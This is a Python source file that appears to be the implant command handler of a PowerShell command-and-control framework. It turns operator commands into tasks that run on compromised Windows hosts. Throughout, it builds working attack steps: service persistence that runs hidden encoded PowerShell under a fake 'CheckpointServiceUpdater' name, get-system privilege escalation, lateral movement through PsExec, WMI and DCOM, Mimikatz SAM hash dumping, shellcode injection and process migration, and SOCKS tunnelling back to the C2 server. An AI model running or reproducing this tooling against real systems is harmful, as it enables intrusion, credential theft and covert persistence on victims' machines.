import base64, re, traceback, os, sys, readline
from Alias import ps_alias
from Colours import Colours
from Utils import validate_sleep_time
from DB import new_task, update_sleep, get_history, select_item, update_label, unhide_implant, kill_implant, get_implantdetails, get_c2server_all, get_newimplanturl, get_allurls, get_sharpurls
from AutoLoads import check_module_loaded, run_autoloads
from Help import COMMANDS, posh_help, posh_help1, posh_help2, posh_help3, posh_help4, posh_help5, posh_help6, posh_help7, posh_help8
from Config import PayloadsDirectory, POSHDIR, ROOTDIR, SocksHost
from Core import readfile_with_completion, shellcodefilecomplete
from Opsec import ps_opsec
from Payloads import Payloads
from Utils import argp, load_file, gen_key
from TabComplete import tabCompleter

if os.name == 'nt':
    import pyreadline.rlmain


def handle_ps_command(command, user, randomuri, startup, createdaisypayload, createproxypayload):
    try:
        check_module_loaded("Stage2-Core.ps1", randomuri, user)
    except Exception as e:
        print("Error loading Stage2-Core.ps1: %s" % e)

    run_autoloads(command, randomuri, user)

    # alias mapping
    for alias in ps_alias:
        if command.lower().strip().startswith(alias[0]):
            command.replace(alias[0], alias[1])

    # opsec failures
    for opsec in ps_opsec:
        if opsec == command.lower()[:len(opsec)]:
            print(Colours.RED)
            print("**OPSEC Warning**")
            impid = get_implantdetails(randomuri)
            ri = input("Do you want to continue running - %s? (y/N) " % command)
            if ri.lower() == "n":
                command = ""
            if ri == "":
                command = ""
            if ri.lower() == "y":
                command = command
            break

    if ('beacon' in command.lower() and '-beacon' not in command.lower()) or 'set-beacon' in command.lower() or 'setbeacon' in command.lower():
        new_sleep = command.replace('set-beacon ', '')
        new_sleep = new_sleep.replace('setbeacon ', '')
        new_sleep = new_sleep.replace('beacon ', '').strip()
        if not validate_sleep_time(new_sleep):
            print(Colours.RED)
            print("Invalid sleep command, please specify a time such as 50s, 10m or 1h")
            print(Colours.GREEN)
        else:
            new_task(command, user, randomuri)
            update_sleep(new_sleep, randomuri)

    elif (command.lower().startswith('label-implant')):
        label = command.replace('label-implant ', '')
        update_label(label, randomuri)
        startup(user)

    elif "searchhelp" in command.lower():
        searchterm = (command.lower()).replace("searchhelp ", "")
        helpful = posh_help.split('\n')
        for line in helpful:
            if searchterm in line.lower():
                print(line)

    elif (command == "back") or (command == "clear") or (command == "back ") or (command == "clear "):
        startup(user)

    elif "install-servicelevel-persistencewithproxy" in command.lower():
        C2 = get_c2server_all()
        if C2[11] == "":
            startup(user, "Need to run createproxypayload first")
        else:
            newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
                                  C2[13], C2[11], "", "", C2[19], C2[20],
                                  C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
            payload = newPayload.CreateRawBase()
            cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
            new_task(cmd, user, randomuri)

    elif "install-servicelevel-persistence" in command.lower():
        C2 = get_c2server_all()
        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
                              "", "", "", "", C2[19], C2[20],
                              C2[21], get_newimplanturl(), PayloadsDirectory)
        payload = newPayload.CreateRawBase()
        cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
        new_task(cmd, user, randomuri)

    elif "remove-servicelevel-persistence" in command.lower():
        new_task("sc.exe delete CPUpdater", user, randomuri)

    # psexec lateral movement
    elif "get-implantworkingdirectory" in command.lower():
        new_task("pwd", user, randomuri)

    elif "get-system-withproxy" in command.lower():
        C2 = get_c2server_all()
        if C2[11] == "":
            startup(user, "Need to run createproxypayload first")
        else:
            newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
                                  C2[13], C2[11], "", "", C2[19], C2[20],
                                  C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
            payload = newPayload.CreateRawBase()
            cmd = "sc.exe create CPUpdaterMisc binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceModule start= auto" % payload
            new_task(cmd, user, randomuri)
            cmd = "sc.exe start CPUpdaterMisc"
            new_task(cmd, user, randomuri)
            cmd = "sc.exe delete CPUpdaterMisc"
            new_task(cmd, user, randomuri)

    elif "get-system-withdaisy" in command.lower():
        C2 = get_c2server_all()
        daisyname = input("Payload name required: ")
        if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
            with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
                payload = p.read()
            cmd = "sc.exe create CPUpdaterMisc binpath= 'cmd /c %s' Displayname= CheckpointServiceModule start= auto" % payload
            new_task(cmd, user, randomuri)
            cmd = "sc.exe start CPUpdaterMisc"
            new_task(cmd, user, randomuri)
            cmd = "sc.exe delete CPUpdaterMisc"
            new_task(cmd, user, randomuri)

    elif "get-system" in command.lower():
        C2 = get_c2server_all()
        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
                              "", "", "", "", C2[19], C2[20],
                              C2[21], get_newimplanturl(), PayloadsDirectory)
        payload = newPayload.CreateRawBase()
        cmd = "sc.exe create CPUpdaterMisc binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceModule start= auto" % payload
        new_task(cmd, user, randomuri)
        cmd = "sc.exe start CPUpdaterMisc"
        new_task(cmd, user, randomuri)
        cmd = "sc.exe delete CPUpdaterMisc"
        new_task(cmd, user, randomuri)

    elif "quit" in command.lower():
        ri = input("Are you sure you want to quit? (Y/n) ")
        if ri.lower() == "n":
            startup(user)
        if ri == "":
            sys.exit(0)
        if ri.lower() == "y":
            sys.exit(0)

    elif "invoke-psexecproxypayload" in command.lower():
        check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
        if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, "Proxy"))):
            with open("%s%spayload.bat" % (PayloadsDirectory, "Proxy"), "r") as p:
                payload = p.read()
            params = re.compile("invoke-psexecproxypayload ", re.IGNORECASE)
            params = params.sub("", command)
            cmd = "invoke-psexec %s -command \"%s\"" % (params, payload)
            new_task(cmd, user, randomuri)
        else:
            startup(user, "Need to run createproxypayload first")

    elif "invoke-psexecdaisypayload" in command.lower():
        check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
        daisyname = input("Payload name required: ")
        if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
            with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
                payload = p.read()
            params = re.compile("invoke-psexecdaisypayload ", re.IGNORECASE)
            params = params.sub("", command)
            cmd = "invoke-psexec %s -command \"%s\"" % (params, payload)
            new_task(cmd, user, randomuri)
        else:
            startup(user, "Need to run createdaisypayload first")

    elif "invoke-psexecpayload" in command.lower():
        check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
        C2 = get_c2server_all()
        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
                              "", "", "", "", C2[19], C2[20],
                              C2[21], get_newimplanturl(), PayloadsDirectory)
        payload = newPayload.CreateRawBase()
        params = re.compile("invoke-psexecpayload ", re.IGNORECASE)
        params = params.sub("", command)
        cmd = "invoke-psexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params, payload)
        new_task(cmd, user, randomuri)

    # wmi lateral movement
    elif "invoke-wmiproxypayload" in command.lower():
        check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
        if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, "Proxy"))):
            with open("%s%spayload.bat" % (PayloadsDirectory, "Proxy"), "r") as p:
                payload = p.read()
            params = re.compile("invoke-wmiproxypayload ", re.IGNORECASE)
            params = params.sub("", command)
            cmd = "invoke-wmiexec %s -command \"%s\"" % (params, payload)
            new_task(cmd, user, randomuri)
        else:
            startup(user, "Need to run createproxypayload first")

    elif "invoke-wmidaisypayload" in command.lower():
        check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
        daisyname = input("Name required: ")
        if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
            with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
                payload = p.read()
            params = re.compile("invoke-wmidaisypayload ", re.IGNORECASE)
            params = params.sub("", command)
            cmd = "invoke-wmiexec %s -command \"%s\"" % (params, payload)
            new_task(cmd, user, randomuri)
        else:
            startup(user, "Need to run createdaisypayload first")

    elif "invoke-wmipayload" in command.lower():
        check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
        C2 = get_c2server_all()
        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
                              "", "", "", "", C2[19], C2[20],
                              C2[21], get_newimplanturl(), PayloadsDirectory)
        payload = newPayload.CreateRawBase()
        params = re.compile("invoke-wmipayload ", re.IGNORECASE)
        params = params.sub("", command)
        cmd = "invoke-wmiexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params, payload)
        new_task(cmd, user, randomuri)

    # dcom lateral movement
    elif "invoke-dcomproxypayload" in command.lower():
        if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, "Proxy"))):
            with open("%s%spayload.bat" % (PayloadsDirectory, "Proxy"), "r") as p:
                payload = p.read()
            params = re.compile("invoke-wmiproxypayload ", re.IGNORECASE)
            params = params.sub("", command)
            p = re.compile(r'(?<=-target.).*')
            target = re.search(p, command).group()
            pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c %s\",\"7\")" % (target, payload)
            new_task(pscommand, user, randomuri)
        else:
            startup(user, "Need to run createproxypayload first")

    elif "invoke-dcomdaisypayload" in command.lower():
        daisyname = input("Name required: ")
        if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
            with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
                payload = p.read()
            p = re.compile(r'(?<=-target.).*')
            target = re.search(p, command).group()
            pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target, payload)
            new_task(pscommand, user, randomuri)
        else:
            startup(user, "Need to run createdaisypayload first")

    elif "invoke-dcompayload" in command.lower():
        C2 = get_c2server_all()
        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
                              "", "", "", "", C2[19], C2[20],
                              C2[21], get_newimplanturl(), PayloadsDirectory)
        payload = newPayload.CreateRawBase()
        p = re.compile(r'(?<=-target.).*')
        target = re.search(p, command).group()
        pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target, payload)
        new_task(pscommand, user, randomuri)

    # runas payloads
    elif "invoke-runasdaisypayload" in command.lower():
        daisyname = input("Name required: ")
        if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
            with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
                payload = p.read()
            new_task("$proxypayload = \"%s\"" % payload, user, randomuri)
            check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
            check_module_loaded("NamedPipeDaisy.ps1", randomuri, user)
            params = re.compile("invoke-runasdaisypayload ", re.IGNORECASE)
            params = params.sub("", command)
            pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSDaisy'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
            pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params, base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
            new_task(pscommand, user, randomuri)
        else:
            startup(user, "Need to run createdaisypayload first")

    elif "invoke-runasproxypayload" in command.lower():
        C2 = get_c2server_all()
        if C2[11] == "":
            startup(user, "Need to run createproxypayload first")
        else:
            newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
                                  C2[13], C2[11], "", "", C2[19], C2[20],
                                  C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
            payload = newPayload.CreateRawBase()
            proxyvar = "$proxypayload = \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % payload
            new_task(proxyvar, user, randomuri)
            check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
            check_module_loaded("NamedPipeProxy.ps1", randomuri, user)
            params = re.compile("invoke-runasproxypayload ", re.IGNORECASE)
            params = params.sub("", command)
            pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
            pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params, base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
            new_task(pscommand, user, randomuri)

    elif "invoke-runaspayload" in command.lower():
        check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
        check_module_loaded("NamedPipe.ps1", randomuri, user)
        params = re.compile("invoke-runaspayload ", re.IGNORECASE)
        params = params.sub("", command)
        pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
        pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params, base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
        new_task(pscommand, user, randomuri)

    elif command.lower() == "help" or command == "?" or command.lower() == "help ":
        print(posh_help)
    elif command.lower() == "help 1":
        print(posh_help1)
    elif command.lower() == "help 2":
        print(posh_help2)
    elif command.lower() == "help 3":
        print(posh_help3)
    elif command.lower() == "help 4":
        print(posh_help4)
    elif command.lower() == "help 5":
        print(posh_help5)
    elif command.lower() == "help 6":
        print(posh_help6)
    elif command.lower() == "help 7":
        print(posh_help7)
    elif command.lower() == "help 8":
        print(posh_help8)

    elif "get-pid" in command.lower():
        pid = get_implantdetails(randomuri)
        print(pid[8])

    elif "upload-file" in command.lower():
        source = ""
        destination = ""
        s = ""
        nothidden = False
        if command.strip().lower() == "upload-file":
            source = readfile_with_completion("Location of file to upload: ")
            while not os.path.isfile(source):
                print("File does not exist: %s" % source)
                source = readfile_with_completion("Location of file to upload: ")
            destination = input("Location to upload to: ")
        else:
            args = argp(command)
            source = args.source
            destination = args.destination
            nothidden = args.nothidden
        try:
            with open(source, "rb") as source_file:
                s = source_file.read()
            if s:
                sourceb64 = base64.b64encode(s).decode("utf-8")
                destination = destination.replace("\\", "\\\\")
                print("")
                print("Uploading %s to %s" % (source, destination))
                if (nothidden):
                    uploadcommand = "Upload-File -Destination \"%s\" -NotHidden %s -Base64 %s" % (destination, nothidden, sourceb64)
                else:
                    uploadcommand = "Upload-File -Destination \"%s\" -Base64 %s" % (destination, sourceb64)
                new_task(uploadcommand, user, randomuri)
            else:
                print("Source file could not be read or was empty")
        except Exception as e:
            print("Error with source file: %s" % e)
            traceback.print_exc()

    elif "kill-implant" in command.lower() or "exit" in command.lower():
        impid = get_implantdetails(randomuri)
        ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
        if ri.lower() == "n":
            print("Implant not terminated")
        if ri == "":
            new_task("exit", user, randomuri)
            kill_implant(randomuri)
        if ri.lower() == "y":
            new_task("exit", user, randomuri)
            kill_implant(randomuri)

    elif "unhide-implant" in command.lower():
        unhide_implant(randomuri)

    elif "hide-implant" in command.lower():
        kill_implant(randomuri)

    elif "migrate" in command[:7].lower():
        params = re.compile("migrate", re.IGNORECASE)
        params = params.sub("", command)
        migrate(randomuri, user, params)

    elif "loadmoduleforce" in command.lower():
        params = re.compile("loadmoduleforce ", re.IGNORECASE)
        params = params.sub("", command)
        check_module_loaded(params, randomuri, user, force=True)

    elif "loadmodule" in command.lower():
        params = re.compile("loadmodule ", re.IGNORECASE)
        params = params.sub("", command)
        check_module_loaded(params, randomuri, user)

    elif "invoke-daisychain" in command.lower():
        urls = get_allurls()
        new_task("%s -URLs '%s'" % (command, urls), user, randomuri)
        update_label("DaisyServer", randomuri)
        startup(user)
        print("Now use createdaisypayload")

    elif "inject-shellcode" in command.lower():
        params = re.compile("inject-shellcode", re.IGNORECASE)
        params = params.sub("", command)
        check_module_loaded("Inject-Shellcode.ps1", randomuri, user)
        readline.set_completer(shellcodefilecomplete)
        path = input("Location of shellcode file: ")
        t = tabCompleter()
        t.createListCompleter(COMMANDS)
        readline.set_completer(t.listCompleter)
        try:
            shellcodefile = load_file(path)
            if shellcodefile is not None:
                arch = "64"
                new_task("$Shellcode%s=\"%s\" #%s" % (arch, base64.b64encode(shellcodefile).decode("utf-8"), os.path.basename(path)), user, randomuri)
                new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), user, randomuri)
        except Exception as e:
            print("Error loading file: %s" % e)

    elif "listmodules" in command.lower():
        print(os.listdir("%s/Modules/" % POSHDIR))

    elif "modulesloaded" in command.lower():
        ml = get_implantdetails(randomuri)
        print(ml[14])

    elif (command.lower() == "ps") or (command.lower() == "ps "):
        new_task("get-processlist", user, randomuri)

    elif (command.lower() == "hashdump") or (command.lower() == "hashdump "):
        check_module_loaded("Invoke-Mimikatz.ps1", randomuri, user)
        new_task("Invoke-Mimikatz -Command '\"lsadump::sam\"'", user, randomuri)

    elif (command.lower() == "sharpsocks") or (command.lower() == "sharpsocks "):
        check_module_loaded("SharpSocks.ps1", randomuri, user)
        import string
        from random import choice
        allchar = string.ascii_letters
        channel = "".join(choice(allchar) for x in range(25))
        sharpkey = gen_key().decode("utf-8")
        sharpurls = get_sharpurls()
        sharpurl = select_item("HostnameIP", "C2Server")
        implant = get_implantdetails(randomuri)
        if "Daisy" in implant[15]:
            print("")
            print("Daisy Implant Detected:")
            print("")
            sharpurl = input("[+] What is the DaisyServer URL: ")

        print(POSHDIR + "SharpSocks/SharpSocksServerCore -c=%s -k=%s --verbose -l=%s\r\n" % (channel, sharpkey, SocksHost) + Colours.GREEN)
        ri = input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
        if ri.lower() == "n":
            print("")
        if ri == "":
            new_task("Sharpsocks -Client -Uri %s -Channel %s -Key %s -URLs %s -Insecure -Beacon 2000" % (sharpurl, channel, sharpkey, sharpurls), user, randomuri)
        if ri.lower() == "y":
            new_task("Sharpsocks -Client -Uri %s -Channel %s -Key %s -URLs %s -Insecure -Beacon 2000" % (sharpurl, channel, sharpkey, sharpurls), user, randomuri)
        update_label("SharpSocks", randomuri)

    elif (command.lower() == "history") or command.lower() == "history ":
        startup(user, get_history())

    elif "reversedns" in command.lower():
        params = re.compile("reversedns ", re.IGNORECASE)
        params = params.sub("", command)
        new_task("[System.Net.Dns]::GetHostEntry(\"%s\")" % params, user, randomuri)

    elif "createdaisypayload" in command.lower():
        createdaisypayload(user, startup)

    elif "createproxypayload" in command.lower():
        createproxypayload(user, startup)

    elif "createnewpayload" in command.lower():
        createproxypayload(user, startup)

    else:
        if command:
            new_task(command, user, randomuri)
        return


def migrate(randomuri, user, params=""):
    implant = get_implantdetails(randomuri)
    implant_arch = implant[10]
    implant_comms = implant[15]

    if implant_arch == "AMD64":
        arch = "64"
    else:
        arch = "86"

    if implant_comms == "PS":
        path = "%spayloads/Posh_v4_x%s_Shellcode.bin" % (ROOTDIR, arch)
        shellcodefile = load_file(path)
    elif "Daisy" in implant_comms:
        daisyname = input("Name required: ")
        path = "%spayloads/%sPosh_v4_x%s_Shellcode.bin" % (ROOTDIR, daisyname, arch)
        shellcodefile = load_file(path)
    elif "Proxy" in implant_comms:
        path = "%spayloads/ProxyPosh_v4_x%s_Shellcode.bin" % (ROOTDIR, arch)
        shellcodefile = load_file(path)
    check_module_loaded("Inject-Shellcode.ps1", randomuri, user)
    new_task("$Shellcode%s=\"%s\" #%s" % (arch, base64.b64encode(shellcodefile).decode("utf-8"), os.path.basename(path)), user, randomuri)
    new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), user, randomuri)
